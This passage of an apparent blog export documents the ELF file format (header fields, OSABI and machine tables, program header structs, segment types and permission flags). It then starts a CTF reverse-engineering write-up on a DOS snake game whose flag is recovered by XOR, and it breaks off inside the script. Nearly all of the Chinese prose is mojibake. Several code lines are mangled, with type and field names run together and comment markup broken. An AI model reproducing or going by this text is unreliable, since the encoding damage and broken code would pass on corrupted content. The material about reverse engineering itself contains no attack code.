64ä½</li></ul><p>EI_DATAï¼š(1å­—èŠ‚)</p><ul><li>0 æ— æ•ˆæ•°æ®ç¼–ç </li><li>1 å°ç«¯åº</li><li>2 å¤§ç«¯åº</li></ul><p>EI_VERSIONï¼šåªæœ‰01è¿™ä¸ªå€¼</p><p>EI_OSABIï¼šæ“ä½œç³»ç»Ÿ/ABIæ ‡è¯†</p><table><thead><tr><th style="text-align:left">å®åç§°</th><th style="text-align:center">å€¼</th><th style="text-align:left">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:left">ELFOSABI_NONE</td><td style="text-align:center">0</td><td style="text-align:left">No extensions or unspecified</td></tr><tr><td style="text-align:left">ELFOSABI_SYSV</td><td style="text-align:center">0</td><td style="text-align:left">UNIX System V ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HPUX</td><td style="text-align:center">1</td><td style="text-align:left">HP-UX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NETBSD</td><td style="text-align:center">2</td><td style="text-align:left">NetBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_LINUX</td><td style="text-align:center">3</td><td style="text-align:left">Linux ABI</td></tr><tr><td style="text-align:left">ELFOSABI_HURD</td><td style="text-align:center">4</td><td style="text-align:left">GNU Hurd ABI</td></tr><tr><td style="text-align:left">ELFOSABI_SOLARIS</td><td style="text-align:center">6</td><td style="text-align:left">Sun Solaris ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AIX</td><td style="text-align:center">7</td><td style="text-align:left">IBM AIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_IRIX</td><td style="text-align:center">8</td><td style="text-align:left">SGI Irix ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FREEBSD</td><td style="text-align:center">9</td><td style="text-align:left">FreeBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_TRU64</td><td style="text-align:center">10</td><td style="text-align:left">Compaq TRU64 UNIX ABI</td></tr><tr><td style="text-align:left">ELFOSABI_MODESTO</td><td style="text-align:center">11</td><td style="text-align:left">Novell Modesto ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENBSD</td><td style="text-align:center">12</td><td style="text-align:left">OpenBSD ABI</td></tr><tr><td style="text-align:left">ELFOSABI_OPENVMS</td><td style="text-align:center">13</td><td style="text-align:left">OpenVMS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_NSK</td><td style="text-align:center">14</td><td style="text-align:left">NonStop Kernel ABI</td></tr><tr><td style="text-align:left">ELFOSABI_AROS</td><td style="text-align:center">15</td><td style="text-align:left">AROS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_FENIXOS</td><td style="text-align:center">16</td><td style="text-align:left">Fenix OS ABI</td></tr><tr><td style="text-align:left">ELFOSABI_CLOUDABI</td><td style="text-align:center">17</td><td style="text-align:left">CloudABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM_AEABI</td><td style="text-align:center">64</td><td style="text-align:left">ARM EABI</td></tr><tr><td style="text-align:left">ELFOSABI_ARM</td><td style="text-align:center">97</td><td style="text-align:left">ARM ABI</td></tr><tr><td style="text-align:left">ELFOSABI_STANDALONE</td><td style="text-align:center">255</td><td style="text-align:left">Standalone (embedded) application</td></tr></tbody></table><p>EI_ABIVERSIONï¼š</p><p>è¿›ä¸€æ­¥æŒ‡å®šABIç‰ˆæœ¬</p><p>elf padï¼šå¡«å……å­—èŠ‚ï¼Œç½®0</p><h3 id="E-TYPE">E_TYPE</h3><p>æ ‡æ˜æ–‡ä»¶ç±»å‹ï¼ˆ2å­—èŠ‚ï¼‰</p><table><thead><tr><th style="text-align:left">å®åç§°</th><th style="text-align:center">å€¼</th><th style="text-align:left">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:left">ET_NONE</td><td style="text-align:center">0</td><td style="text-align:left">æ— æ–‡ä»¶ç±»å‹</td></tr><tr><td style="text-align:left">ET_REL</td><td style="text-align:center">1</td><td style="text-align:left">å¯é‡å®šä½æ–‡ä»¶</td></tr><tr><td style="text-align:left">ET_EXEC</td><td style="text-align:center">2</td><td style="text-align:left">å¯æ‰§è¡Œæ–‡ä»¶</td></tr><tr><td style="text-align:left">ET_DYN</td><td style="text-align:center">3</td><td style="text-align:left">å…±äº«ç›®æ ‡æ–‡ä»¶</td></tr><tr><td style="text-align:left">ET_CORE</td><td style="text-align:center">4</td><td style="text-align:left">æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶</td></tr><tr><td style="text-align:left">ET_NUM</td><td style="text-align:center">5</td><td style="text-align:left">å®šä¹‰çš„æ–‡ä»¶ç±»å‹æ•°é‡</td></tr><tr><td style="text-align:left">ET_LOOS</td><td style="text-align:center">0xFE00</td><td style="text-align:left">ç‰¹å®šæ“ä½œç³»ç»Ÿç›®æ ‡æ–‡ä»¶ç±»å‹å€¼èŒƒå›´çš„ä¸‹é™</td></tr><tr><td style="text-align:left">ET_HIOS</td><td style="text-align:center">0xFEFF</td><td style="text-align:left">ç‰¹å®šæ“ä½œç³»ç»Ÿç›®æ ‡æ–‡ä»¶ç±»å‹å€¼èŒƒå›´çš„ä¸Šé™</td></tr><tr><td style="text-align:left">ET_LOPROC</td><td style="text-align:center">0xFF00</td><td style="text-align:left">ç‰¹å®šå¤„ç†å™¨ç›®æ ‡æ–‡ä»¶ç±»å‹å€¼èŒƒå›´çš„ä¸‹é™</td></tr><tr><td style="text-align:left">ET_HIPROC</td><td style="text-align:center">0xFFFF</td><td style="text-align:left">ç‰¹å®šå¤„ç†å™¨ç›®æ ‡æ–‡ä»¶ç±»å‹å€¼èŒƒå›´çš„ä¸Šé™</td></tr></tbody></table><h3 id="e-machine">e_machine</h3><p>æ ‡æ˜å¤„ç†å™¨æ¶æ„å’ŒæŒ‡ä»¤é›†ï¼ˆ2å­—èŠ‚ï¼‰</p><table><thead><tr><th style="text-align:left">å®åç§°</th><th style="text-align:center">å€¼</th><th style="text-align:left">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:left">EM_NONE</td><td style="text-align:center">0</td><td style="text-align:left">æ— æœºå™¨ç±»å‹</td></tr><tr><td style="text-align:left">EM_M32</td><td style="text-align:center">1</td><td style="text-align:left">AT&amp;T WE 32100</td></tr><tr><td style="text-align:left">EM_SPARC</td><td style="text-align:center">2</td><td style="text-align:left">SUN SPARC</td></tr><tr><td style="text-align:left">EM_386</td><td style="text-align:center">3</td><td style="text-align:left">Intel 80386(x86)</td></tr><tr><td style="text-align:left">EM_68K</td><td style="text-align:center">4</td><td style="text-align:left">Motorola 68000(M68k)</td></tr><tr><td style="text-align:left">EM_88K</td><td style="text-align:center">5</td><td style="text-align:left">Motorola 88000(M88k)</td></tr><tr><td style="text-align:left">EM_860</td><td style="text-align:center">7</td><td style="text-align:left">Intel 80860</td></tr><tr><td style="text-align:left">EM_MIPS</td><td style="text-align:center">8</td><td style="text-align:left">MIPS R3000 big-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS3_LE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R3000 little-endian</td></tr><tr><td style="text-align:left">EM_MIPS_RS4_BE</td><td style="text-align:center">10</td><td style="text-align:left">MIPS R4000 big-endian</td></tr><tr><td style="text-align:left">EM_PPC</td><td style="text-align:center">20</td><td style="text-align:left">PowerPC</td></tr><tr><td style="text-align:left">EM_PPC64</td><td style="text-align:center">21</td><td style="text-align:left">PowerPC 64-bit</td></tr><tr><td style="text-align:left">EM_ARM</td><td style="text-align:center">40</td><td style="text-align:left">ARM 32-bit(up to ARMv7/Aarch32)</td></tr><tr><td style="text-align:left">EM_SPARCV9</td><td style="text-align:center">43</td><td style="text-align:left">SPARC v9 64-bit</td></tr><tr><td style="text-align:left">EM_IA_64</td><td style="text-align:center">50</td><td style="text-align:left">HP/Intel IA-64</td></tr><tr><td style="text-align:left">EM_X86_64</td><td style="text-align:center">62</td><td style="text-align:left">AMD x86-64</td></tr><tr><td style="text-align:left">EM_MSP430</td><td style="text-align:center">105</td><td style="text-align:left">Texas Instruments msp430</td></tr><tr><td style="text-align:left">EM_ALTERA_NIOS2</td><td style="text-align:center">113</td><td style="text-align:left">Altera Nios II</td></tr><tr><td style="text-align:left">EM_AARCH64</td><td style="text-align:center">183</td><td style="text-align:left">ARM 64-bit(ARMv8/Aarch64)</td></tr><tr><td style="text-align:left">EM_AVR32</td><td style="text-align:center">185</td><td style="text-align:left">Amtel 32-bit microprocessor</td></tr><tr><td style="text-align:left">EM_STM8</td><td style="text-align:center">186</td><td style="text-align:left">STMicroelectronics STM8</td></tr><tr><td style="text-align:left">EM_RISCV</td><td style="text-align:center">243</td><td style="text-align:left">RISC-V</td></tr><tr><td style="text-align:left">EM_BPF</td><td style="text-align:center">247</td><td style="text-align:left">Linux BPF â€“ in-kernel virtual machine</td></tr></tbody></table><h3 id="e-version">e_version</h3><p>å½“å‰æ–‡ä»¶ç‰ˆæœ¬ï¼ˆå››å­—èŠ‚ï¼‰</p><p>0 æ— ç‰ˆæœ¬</p><p>å…¶å®ƒ å½“å‰ç‰ˆæœ¬å·</p><h3 id="ç¨‹åºå…¥å£">ç¨‹åºå…¥å£</h3><p>8å­—èŠ‚ï¼Œæ ‡æ˜å…¥å£ç‚¹</p><h3 id="ç¨‹åºå¤´è¡¨åç§»">ç¨‹åºå¤´è¡¨åç§»</h3><p>8å­—èŠ‚ï¼Œæè¿°æ®µè¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»</p><h3 id="åŒºè¡¨åç§»">åŒºè¡¨åç§»</h3><p>8å­—èŠ‚ï¼Œæè¿°åŒºè¡¨åœ¨æ–‡ä»¶ä¸­çš„åç§»</p><h3 id="e-flag">e_flag</h3><p>å¤„ç†å™¨æŒ‡å®šçš„ä¸æ–‡ä»¶ç›¸å…³è”çš„flag(4å­—èŠ‚ï¼Œä¸€èˆ¬æ˜¯0)</p><h3 id="ELF-header-å¤§å°">ELF_header å¤§å°</h3><p>2å­—èŠ‚ï¼ŒæŒ‡æ˜å¤´å¤§å°ã€‚ä¸€èˆ¬ä¸º0x40</p><h3 id="ç¨‹åºå¤´è¡¨å¤§å°">ç¨‹åºå¤´è¡¨å¤§å°</h3><p>2å­—èŠ‚ï¼Œå¦‚æœæ²¡æœ‰ç¨‹åºå¤´è¡¨ï¼Œåˆ™ä¸º0</p><h3 id="ç¨‹åºå¤´å†…å®¹æ•°é‡">ç¨‹åºå¤´å†…å®¹æ•°é‡</h3><p>2å­—èŠ‚ï¼Œæ ‡æ˜ç¨‹åºå¤´è¡¨ä¸­çš„å†…å®¹ä¸ªæ•°</p><h3 id="èŠ‚åŒºå¤´è¡¨å¤§å°">èŠ‚åŒºå¤´è¡¨å¤§å°</h3><p>2å­—èŠ‚ï¼Œå¦‚æœæ²¡æœ‰èŠ‚åŒºå¤´è¡¨ï¼Œåˆ™ä¸º0</p><h3 id="èŠ‚åŒºå¤´å†…å®¹æ•°é‡">èŠ‚åŒºå¤´å†…å®¹æ•°é‡</h3><p>2å­—èŠ‚ï¼Œæ ‡æ˜èŠ‚åŒºå¤´è¡¨ä¸­çš„å†…å®¹ä¸ªæ•°</p><h3 id="èŠ‚åŒºå¤´å­—ç¬¦è¡¨ç´¢å¼•">èŠ‚åŒºå¤´å­—ç¬¦è¡¨ç´¢å¼•</h3><p>2å­—èŠ‚ï¼Œæœ‰ä»¥ä¸‹å¯é€‰å€¼</p><p>/* Special section indices. */</p><p>#define SHN_UNDEF 0 /* Undefined section <em>/<br>#define SHN_LORESERVE 0xff00 /</em> Start of reserved indices <em>/<br>#define SHN_LOPROC 0xff00 /</em> Start of processor-specific <em>/<br>#define SHN_BEFORE 0xff00 /</em> Order section before all others<br>(Solaris). <em>/<br>#define SHN_AFTER 0xff01 /</em> Order section after all others<br>(Solaris). <em>/<br>#define SHN_HIPROC 0xff1f /</em> End of processor-specific <em>/<br>#define SHN_LOOS 0xff20 /</em> Start of OS-specific <em>/<br>#define SHN_HIOS 0xff3f /</em> End of OS-specific <em>/<br>#define SHN_ABS 0xfff1 /</em> Associated symbol is absolute <em>/<br>#define SHN_COMMON 0xfff2 /</em> Associated symbol is common <em>/<br>#define SHN_XINDEX 0xffff /</em> Index is in extra table. <em>/<br>#define SHN_HIRESERVE 0xffff /</em> End of reserved indices */</p><h2 id="program-header-table">program_header_table</h2><p>æ˜¯ä¸€ä¸ªç»“æ„ä½“æ•°ç»„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PN_XNUM0xffff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf32_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf32_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf32_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf32_Wordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf32_Wordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf32_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf32_Wordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf32_Phdr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf64_Wordp_type;<span class="comment">/* Segment type */</span></span><br><span class="line">    Elf64_Wordp_flags;<span class="comment">/* Segment flags */</span></span><br><span class="line">    Elf64_Offp_offset;<span class="comment">/* Segment file offset */</span></span><br><span class="line">    Elf64_Addrp_vaddr;<span class="comment">/* Segment virtual address */</span></span><br><span class="line">    Elf64_Addrp_paddr;<span class="comment">/* Segment physical address */</span></span><br><span class="line">    Elf64_Xwordp_filesz;<span class="comment">/* Segment size in file */</span></span><br><span class="line">    Elf64_Xwordp_memsz;<span class="comment">/* Segment size in memory */</span></span><br><span class="line">    Elf64_Xwordp_align;<span class="comment">/* Segment alignment */</span></span><br><span class="line">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure><h3 id="æ®µç±»å‹">æ®µç±»å‹</h3><p>p_typeï¼Œå››å­—èŠ‚</p><table><thead><tr><th style="text-align:left">å®åç§°</th><th style="text-align:center">å€¼</th><th style="text-align:left">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:left">PT_NULL</td><td style="text-align:center">0</td><td style="text-align:left">è¯¥æ•°ç»„å…ƒç´ æœªä½¿ç”¨ã€‚é™¤p_typeå¤–ï¼Œå…¶ä»–ç»“æ„ä½“æˆå‘˜çš„å€¼éƒ½æ˜¯æœªå®šä¹‰çš„ã€‚è¿™ç§ç±»å‹å¯ä»¥ä½¿ç¨‹åºå¤´è¡¨(Program Header Table)å¿½ç•¥æ­¤æ¡ç›®ã€‚</td></tr><tr><td style="text-align:left">PT_LOAD</td><td style="text-align:center">1</td><td style="text-align:left">æ­¤ç±»å‹æ®µä¸ºä¸€ä¸ªå¯åŠ è½½çš„æ®µï¼Œå¤§å°ç”±p_fileszå’Œp_memszæè¿°ã€‚æ–‡ä»¶ä¸­è¯¥æ®µçš„å†…å®¹è¢«æ˜ å°„åˆ°ç›¸åº”å†…å­˜æ®µçš„å¼€å§‹å¤„ã€‚å¦‚æœp_memszå¤§äºp_fileszï¼Œâ€œå‰©ä½™â€çš„å­—èŠ‚éƒ½è¦è¢«ç½®ä¸º0å¹¶è·Ÿè¸ªæ®µçš„åˆå§‹åŒ–åŒºåŸŸã€‚p_fileszä¸èƒ½å¤§äºp_memszã€‚å¯åŠ è½½çš„æ®µåœ¨ç¨‹åºå¤´è¡¨ä¸­æŒ‰ç…§p_vaddrå‡åºæ’åˆ—ã€‚</td></tr><tr><td style="text-align:left">PT_DYNAMIC</td><td style="text-align:center">2</td><td style="text-align:left">æ­¤ç±»å‹æ®µç»™å‡ºåŠ¨æ€é“¾æ¥ä¿¡æ¯ï¼Œå…·ä½“å‚è§ELFæ‰‹å†ŒBook IIIã€‚</td></tr><tr><td style="text-align:left">PT_INTERP</td><td style="text-align:center">3</td><td style="text-align:left">æ­¤ç±»å‹æ®µç»™å‡ºäº†ä¸€ä¸ªä»¥Nullç»“å°¾çš„å­—ç¬¦ä¸²çš„ä½ç½®å’Œé•¿åº¦ï¼Œè¯¥å­—ç¬¦ä¸²å°†è¢«å½“ä½œè§£é‡Šå™¨çš„è·¯å¾„åè¿›è¡Œè°ƒç”¨ã€‚è¿™ç§æ®µç±»å‹ä»…å¯¹å¯æ‰§è¡Œæ–‡ä»¶æœ‰æ„ä¹‰(ä¹Ÿå¯èƒ½å‡ºç°åœ¨å…±äº«ç›®æ ‡æ–‡ä»¶ä¸­)ã€‚æ­¤å¤–ï¼Œè¿™ç§æ®µåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­æœ€å¤šå‡ºç°ä¸€æ¬¡ã€‚è€Œä¸”è¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ å­˜åœ¨çš„è¯ï¼Œå®ƒå¿…é¡»åœ¨æ‰€æœ‰å¯åŠ è½½æ®µæ¡ç›®çš„å‰é¢ã€‚</td></tr><tr><td style="text-align:left">PT_NOTE</td><td style="text-align:center">4</td><td style="text-align:left">æ­¤ç±»å‹æ®µç»™å‡ºé™„åŠ ä¿¡æ¯çš„ä½ç½®å’Œå¤§å°ã€‚</td></tr><tr><td style="text-align:left">PT_SHLIB</td><td style="text-align:center">5</td><td style="text-align:left">è¯¥æ®µç±»å‹è¢«ä¿ç•™ï¼Œä¸è¿‡è¯­ä¹‰æœªæŒ‡å®šã€‚è€Œä¸”ï¼ŒåŒ…å«è¿™ç§ç±»å‹æ•°ç»„å…ƒç´ çš„ç¨‹åºä¸ç¬¦åˆUnix System Vçš„ELFæ ‡å‡†ï¼Œå…·ä½“å‚è§ELFæ‰‹å†ŒBook IIIã€‚</td></tr><tr><td style="text-align:left">PT_PHDR</td><td style="text-align:center">6</td><td style="text-align:left">è¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ å¦‚æœå­˜åœ¨çš„è¯ï¼Œåˆ™ç»™å‡ºäº†ç¨‹åºå¤´è¡¨è‡ªèº«åœ¨æ–‡ä»¶å’Œç¨‹åºå†…å­˜æ˜ åƒä¸­çš„çš„ä½ç½®å’Œå¤§å°ã€‚æ­¤ç±»å‹çš„æ®µåœ¨æ–‡ä»¶ä¸­æœ€å¤šå‡ºç°ä¸€æ¬¡ã€‚æ­¤å¤–ï¼Œåªæœ‰ç¨‹åºå¤´è¡¨æ˜¯ç¨‹åºå†…å­˜æ˜ åƒçš„ä¸€éƒ¨åˆ†æ—¶ï¼Œè¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ æ‰ä¼šå­˜åœ¨ã€‚å¦‚æœè¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ å­˜åœ¨ï¼Œåˆ™å¿…é¡»åœ¨æ‰€æœ‰å¯åŠ è½½æ®µæ¡ç›®çš„å‰é¢ã€‚</td></tr><tr><td style="text-align:left">PT_TLS</td><td style="text-align:center">7</td><td style="text-align:left">è¯¥æ®µç±»å‹çš„æ•°ç»„å…ƒç´ ç»™å‡ºçº¿ç¨‹æœ¬åœ°å­˜å‚¨æ®µ(TLS)çš„ä¿¡æ¯ã€‚</td></tr><tr><td style="text-align:left">PT_LOOS</td><td style="text-align:center">0x60000000</td><td style="text-align:left">ç‰¹å®šæ“ä½œç³»ç»Ÿæ®µç±»å‹å€¼çš„ä¸‹é™ã€‚</td></tr><tr><td style="text-align:left">PT_GNU_EH_FRAME</td><td style="text-align:center">0x6474E550</td><td style="text-align:left">è¯¥æ®µç±»å‹æ•°ç»„å…ƒç´ æŒ‡å®šå¼‚å¸¸å¤„ç†ä¿¡æ¯çš„ä½ç½®å’Œå¤§å°(ç”±.eh_frame_hdrèŠ‚å®šä¹‰)[^5]ã€‚</td></tr><tr><td style="text-align:left">PT_GNU_STACK</td><td style="text-align:center">0x6474E551</td><td style="text-align:left">è¯¥æ®µç±»å‹æ•°ç»„å…ƒç´ ä¸­çš„p_flagsæˆå‘˜æŒ‡å®šåŒ…å«æ ˆçš„æ®µçš„æƒé™ï¼Œå¹¶ç”¨äºæŒ‡ç¤ºæ ˆæ˜¯å¦åº”è¯¥æ˜¯å¯æ‰§è¡Œçš„ã€‚æ²¡æœ‰æ­¤æ®µç±»å‹çš„æ•°ç»„å…ƒç´ ï¼Œåˆ™è¡¨ç¤ºè¯¥æ ˆå°†æ˜¯å¯æ‰§è¡Œçš„[^5]ã€‚</td></tr><tr><td style="text-align:left">PT_GNU_RELRO</td><td style="text-align:center">0x6474E552</td><td style="text-align:left">è¯¥æ®µç±»å‹æ•°ç»„å…ƒç´ æŒ‡å®šäº†ä¸€ä¸ªåœ¨é‡å®šä½åå¯ä»¥è¢«ç½®ä¸ºåªè¯»çš„æ®µçš„ä½ç½®å’Œå¤§å°[^5]ã€‚</td></tr><tr><td style="text-align:left">PT_GNU_PROPERTY</td><td style="text-align:center">0x6474E553</td><td style="text-align:left">è¯¥æ®µç±»å‹æ•°ç»„å…ƒç´ æŒ‡å®š.note.gnu.propertyèŠ‚çš„ä½ç½®å’Œå¤§å°ã€‚</td></tr><tr><td style="text-align:left">PT_HIOS</td><td style="text-align:center">0x6FFFFFFF</td><td style="text-align:left">ç‰¹å®šæ“ä½œç³»ç»Ÿæ®µç±»å‹å€¼çš„ä¸Šé™ã€‚</td></tr><tr><td style="text-align:left">PT_LOPROC</td><td style="text-align:center">0x70000000</td><td style="text-align:left">ç‰¹å®šå¤„ç†å™¨æ®µç±»å‹å€¼çš„ä¸‹é™ã€‚</td></tr><tr><td style="text-align:left">PT_HIPROC</td><td style="text-align:center">0x7FFFFFFF</td><td style="text-align:left">ç‰¹å®šå¤„ç†å™¨æ®µç±»å‹å€¼çš„ä¸Šé™ã€‚</td></tr></tbody></table><h3 id="æ®µæƒé™">æ®µæƒé™</h3><p>p_flagsï¼Œå››å­—èŠ‚</p><table><thead><tr><th style="text-align:left">å®åç§°</th><th style="text-align:center">å€¼</th><th style="text-align:left">å«ä¹‰</th></tr></thead><tbody><tr><td style="text-align:left">PF_X</td><td style="text-align:center">0x1</td><td style="text-align:left">æ®µå…·æœ‰å¯æ‰§è¡Œæƒé™</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">0x2</td><td style="text-align:left">æ®µå…·æœ‰å†™æƒé™</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">0x4</td><td style="text-align:left">æ®µå…·æœ‰è¯»æƒé™</td></tr><tr><td style="text-align:left">PF_MASKOS</td><td style="text-align:center">0x0FF00000</td><td style="text-align:left">ä¸ºç‰¹å®šæ“ä½œç³»ç»Ÿé¢„ç•™</td></tr><tr><td style="text-align:left">PF_MASKPROC</td><td style="text-align:center">0xF0000000</td><td style="text-align:left">ä¸ºç‰¹å®šå¤„ç†å™¨é¢„ç•™</td></tr></tbody></table><p>å¦‚æœæ˜¯0ï¼Œè¡¨æ˜æ‹’ç»è®¿é—®<br>ä»¥ä¸Šæƒé™å¯ç»„åˆï¼Œä¸”ä¸€èˆ¬æƒ…å†µï¼Œæ®µæ²¡æœ‰å†™æƒé™</p><table><thead><tr><th style="text-align:left">å®åç§°</th><th style="text-align:center">å€¼</th><th style="text-align:left">å‡†ç¡®çš„æƒé™</th><th style="text-align:left">å…è®¸çš„æƒé™</th></tr></thead><tbody><tr><td style="text-align:left">none</td><td style="text-align:center">0</td><td style="text-align:left">æ‹’ç»æ‰€æœ‰è®¿é—®</td><td style="text-align:left">æ‹’ç»æ‰€æœ‰è®¿é—®</td></tr><tr><td style="text-align:left">PF_X</td><td style="text-align:center">1</td><td style="text-align:left">åªæ‰§è¡Œ</td><td style="text-align:left">è¯»ï¼Œæ‰§è¡Œ</td></tr><tr><td style="text-align:left">PF_W</td><td style="text-align:center">2</td><td style="text-align:left">åªå†™</td><td style="text-align:left">è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ</td></tr><tr><td style="text-align:left">PF_W + PF_X</td><td style="text-align:center">3</td><td style="text-align:left">å†™ï¼Œæ‰§è¡Œ</td><td style="text-align:left">è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ</td></tr><tr><td style="text-align:left">PF_R</td><td style="text-align:center">4</td><td style="text-align:left">åªè¯»</td><td style="text-align:left">è¯»ï¼Œæ‰§è¡Œ</td></tr><tr><td style="text-align:left">PF_R + PF_X</td><td style="text-align:center">5</td><td style="text-align:left">è¯»ï¼Œæ‰§è¡Œ</td><td style="text-align:left">è¯»ï¼Œæ‰§è¡Œ</td></tr><tr><td style="text-align:left">PF_R + PF_W</td><td style="text-align:center">6</td><td style="text-align:left">è¯»ï¼Œå†™</td><td style="text-align:left">è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ</td></tr><tr><td style="text-align:left">PF_R + PF_W + PF_X</td><td style="text-align:center">7</td><td style="text-align:left">è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ</td><td style="text-align:left">è¯»ï¼Œå†™ï¼Œæ‰§è¡Œ</td></tr></tbody></table><h3 id="æ®µå†…å®¹">æ®µå†…å®¹</h3><p>Segment Contentsæ ‡æ˜äº†ä¸€ä¸ªæ®µçš„å¤šç§èŠ‚çš„ç±»å‹</p><h3 id="æ®µåç§»">æ®µåç§»</h3><p>åœ¨æ–‡ä»¶ä¸­çš„åç§»ï¼Œ8å­—èŠ‚</p><h3 id="æ®µè™šæ‹Ÿåœ°å€">æ®µè™šæ‹Ÿåœ°å€</h3><p>è¡¨ç¤ºåŠ è½½åçš„ç›¸å¯¹åç§»ã€‚çœŸå®åœ°å€=è™šæ‹Ÿåœ°å€åŸºå€+æ®µè™šæ‹Ÿåœ°å€ï¼Œ8å­—èŠ‚</p><h3 id="æ®µç‰©ç†åœ°å€">æ®µç‰©ç†åœ°å€</h3><p>ä¸çŸ¥é“ä½œç”¨ï¼Œå¯èƒ½æ˜¯åœ¨è™šæ‹Ÿå†…å­˜ä¸­çš„åœ°å€ã€‚8å­—èŠ‚</p><h3 id="æ®µæ–‡ä»¶é•¿åº¦">æ®µæ–‡ä»¶é•¿åº¦</h3><p>æ®µåœ¨æ–‡ä»¶ä¸­çš„é•¿åº¦ï¼Œ8å­—èŠ‚</p><h3 id="æ®µè™šæ‹Ÿé•¿åº¦">æ®µè™šæ‹Ÿé•¿åº¦</h3><p>æ®µåœ¨å†…å­˜ä¸­çš„é•¿åº¦ï¼Œ8å­—èŠ‚</p><h3 id="æ®µå¯¹é½æ–¹å¼">æ®µå¯¹é½æ–¹å¼</h3><p>8å­—èŠ‚ï¼Œä¸€èˆ¬ä¸º4096</p><hr><p>å‚è€ƒï¼š</p><p><a href="https://docs.oracle.com/cd/E26926_01/html/E25910/chapter6-35342.html">ELF æ ‡è¯† - é“¾æ¥ç¨‹åºå’Œåº“æŒ‡å— (oracle.com)</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PEæ–‡ä»¶ç»“æ„ </tag>
            
            <tag> ELF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2024summer-RE</title>
      <link href="/posts/b7df16dd.html"/>
      <url>/posts/b7df16dd.html</url>
      
        <content type="html"><![CDATA[<p>ç¬¬ä¸€æ¬¡é‡åˆ°DCTï¼ŒQAQï¼Œç»ˆç©¶è¿˜æ˜¯è¢«æš´æ‰“äº†</p><h2 id="DosSnake">DosSnake</h2><p>è€ƒå¯Ÿ16ä½æ±‡ç¼–ï¼Œå¤§æ¦‚æ‰“å¼€çœ‹çœ‹ï¼Œæ˜¯ä¸€ä¸ªè´ªåƒè›‡ï¼ŒæŒ‰ç…§æ¸¸æˆé¢˜çš„æƒ¯ä¾‹ï¼Œåº”å½“æ˜¯èƒœåˆ©åè‡ªåŠ¨è¾“å‡ºflag</p><p>çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰ç›¸å…³å‡½æ•°æˆ–è€…å­—ç¬¦ä¸²</p><p>æŸ¥å­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°æœ‰DASCTFï¼Œç„¶åäº¤å‰å¼•ç”¨</p><p>å¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p><p><img src="https://s2.loli.net/2024/07/21/FtOvZPhXBp6o82c.png" alt="image-20240721174647593"></p><p>å¯ä»¥çœ‹åˆ°ç”¨ï¼ˆdiï¼‰dasctfå’Œï¼ˆsiï¼‰åé¢çš„ä½æ•°ä¾æ¬¡å¼‚æˆ–ï¼Œä¸€è½®åé‡ç½®di</p><p>ç›´æ¥å†™è„šæœ¬</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from prism import *</span><br><span class="line">a = [<span 